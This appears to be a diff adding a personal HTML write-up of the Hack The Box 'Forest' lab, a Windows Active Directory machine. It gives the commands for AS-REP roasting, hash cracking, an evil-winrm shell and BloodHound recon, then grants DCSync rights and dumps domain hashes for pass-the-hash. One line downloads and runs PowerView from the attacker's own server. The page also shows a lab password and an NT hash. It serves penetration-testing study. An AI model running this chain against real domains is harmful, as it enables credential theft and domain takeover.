@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>forest.htb Writeup | Kevin Thompson</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" id="code-theme">
+  <style>
+    :root {
+      --bg: #0f1117;
+      --text: #e4e4e4;
+      --primary: #38b2ac;
+    }
+    body.light {
+      --bg: #ffffff;
+      --text: #1a202c;
+    }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      padding: 2rem;
+      line-height: 1.7;
+      transition: background 0.3s, color 0.3s;
+    }
+    a {
+      color: var(--primary);
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .back {
+      margin-bottom: 2rem;
+    }
+    pre {
+      background: #1e1e1e;
+      padding: 1rem;
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+    code {
+      font-family: Consolas, Monaco, monospace;
+    }
+    h1, h2 {
+      margin-top: 2rem;
+      color: var(--primary);
+    }
+    button.toggle-btn {
+      position: fixed;
+      top: 1rem;
+      right: 1rem;
+      background: none;
+      color: var(--text);
+      border: 2px solid var(--text);
+      border-radius: 6px;
+      padding: 0.4rem 0.8rem;
+      cursor: pointer;
+    }
+    .screenshot {
+      display: block;
+      max-width: 100%;
+      margin: 1rem auto;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+  </style>
+</head>
+<body>
+  <button class="toggle-btn" onclick="toggleMode()">Toggle Mode</button>
+  <div class="back"><a href="index.html#htb">← Back to Writeups</a></div>
+
+  <h1>forest.htb</h1>
+  <img src="forest_htb_images/forest_page1_img1.png" class="screenshot" alt="Forest Logo or Title">
+
+  <h2>Ping and Host Discovery</h2>
+  <pre><code class="language-bash">fping 10.129.95.210</code></pre>
+  <img src="forest_htb_images/forest_page1_img2.png" class="screenshot" alt="Ping Result">
+
+  <h2>Host Mapping</h2>
+  <pre><code class="language-bash">echo "10.129.132.20 forest.htb" | sudo tee -a /etc/hosts</code></pre>
+  <img src="forest_htb_images/forest_page1_img3.png" class="screenshot" alt="Host Mapping">
+
+  <h2>Threader3000 Port Scan</h2>
+  <p>Use threader3000 for faster insight and to determine useful ports for nmap targeting. Then you can use those results to run a targeted nmap scan.</p>
+  <img src="forest_htb_images/forest_page2_img1.png" class="screenshot" alt="Threader3000 Output">
+
+  <h2>LDAP Enumeration</h2>
+  <pre><code class="language-bash">ldapsearch -h forest.htb -p 389 -x -b "dc=htb,dc=local"</code></pre>
+  <ul>
+    <li>-h host</li>
+    <li>-p port</li>
+    <li>-x anonymous authentication</li>
+    <li>-b basedn</li>
+  </ul>
+  <img src="forest_htb_images/forest_page2_img2.png" class="screenshot" alt="LDAP Search Output">
+
+  <h2>Using windapsearch</h2>
+  <pre><code class="language-bash">/opt/windapsearch/windapsearch.py -d htb.local --dc-ip forest.htb -U
+/opt/windapsearch/windapsearch.py -d htb.local --dc-ip forest.htb --custom "objectClass=*"</code></pre>
+  <p><code>objectClass=*</code> grabs all domain objects.</p>
+  <img src="forest_htb_images/forest_page3_img1.png" class="screenshot" alt="Windapsearch Output 1">
+  <img src="forest_htb_images/forest_page3_img2.png" class="screenshot" alt="Windapsearch Output 2">
+
+  <h2>Kerberos Pre-auth Bypass (AS-REP Roasting)</h2>
+  <p>Research shows that svc-alfresco does not require Kerberos pre-authentication. This means we can perform an AS-REP roast.</p>
+  <p>Target: <strong>CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local</strong></p>
+  <pre><code class="language-bash">python /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/svc-alfresco -dc-ip forest.htb -no-pass</code></pre>
+  <img src="forest_htb_images/forest_page3_img3.png" class="screenshot" alt="AS-REP Roasting Output">
+
+  <h2>Cracking the Hash with John</h2>
+  <pre><code class="language-bash">john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt</code></pre>
+  <img src="forest_htb_images/forest_page4_img1.png" class="screenshot" alt="John Cracking Hash">
+
+  <h2>Remote Access with evil-winrm</h2>
+  <pre><code class="language-bash">ruby /var/lib/gems/2.7.0/gems/evil-winrm-3.3/lib/evil-winrm.rb -i forest.htb -u svc-alfresco -p s3rvice</code></pre>
+  <img src="forest_htb_images/forest_page4_img2.png" class="screenshot" alt="Evil-WinRM Shell">
+
+  <h2>Domain Recon with BloodHound.py</h2>
+  <p>Instead of bringing over and running SharpHound.exe on the target, we can use <a href="https://github.com/fox-it/BloodHound.py">BloodHound.py</a> to run from our machine.</p>
+  <pre><code class="language-bash">bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.129.133.36</code></pre>
+  <p>BloodHound.py is a Python-based ingestor using Impacket. Import results directly into the BloodHound GUI.</p>
+  <img src="forest_htb_images/forest_page4_img3.png" class="screenshot" alt="BloodHound.py Command">
+
+  <h2>Start Neo4j and BloodHound</h2>
+  <pre><code class="language-bash">sudo neo4j console</code></pre>
+  <p>Login: <code>neo4j:neo4j</code> (Default credentials for neo4j)</p>
+  <p>Start the BloodHound app and drag and drop the results into the GUI.</p>
+  <img src="forest_htb_images/forest_page5_img1.png" class="screenshot" alt="Neo4j Console">
+
+  <h2>Privilege Escalation</h2>
+  <p>Create a new user and assign DCSync rights:</p>
+  <pre><code class="language-bash">net user ktt abc123! /add /domain
+net group "Exchange Windows Permissions" ktt /add
+net localgroup "Remote Management Users" ktt /add</code></pre>
+  <img src="forest_htb_images/forest_page6_img1.png" class="screenshot" alt="Privilege Escalation Commands">
+
+  <h2>Host File Transfer: PowerView.ps1</h2>
+  <pre><code class="language-bash">cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
+pip3 install updog
+updog -p 8080</code></pre>
+  <pre><code class="language-powershell">iex(new-object net.webclient).downloadstring("http://10.10.14.91:8080/PowerView.ps1")</code></pre>
+
+  <h2>DCSync Rights Assignment</h2>
+  <pre><code class="language-powershell">$pass = convertto-securestring 'abc123!' -asplain -force
+$cred = new-object system.management.automation.pscredential('htb\ktt', $pass)
+Add-ObjectACL -PrincipalIdentity ktt -Credential $cred -Rights DCSync</code></pre>
+  <img src="forest_htb_images/forest_page6_img2.png" class="screenshot" alt="DCSync Assignment">
+
+  <h2>Dumping Secrets</h2>
+  <pre><code class="language-bash">/usr/share/doc/python3-impacket/examples/secretsdump.py htb/[email protected]</code></pre>
+
+  <h2>Remote Access with psexec.py</h2>
+  <pre><code class="language-bash">/usr/share/doc/python3-impacket/examples/psexec.py [email protected] -hashes \
+aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</code></pre>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <script>
+    if (localStorage.getItem('theme') === 'light') {
+      document.body.classList.add('light');
+      document.getElementById('code-theme').href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
+    }
+    function toggleMode() {
+      document.body.classList.toggle('light');
+      const newTheme = document.body.classList.contains('light') ? 'light' : 'dark';
+      localStorage.setItem('theme', newTheme);
+      document.getElementById('code-theme').href = newTheme === 'light'
+        ? 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css'
+        : 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css';
+    }
+  </script>
+</body>
+</html>
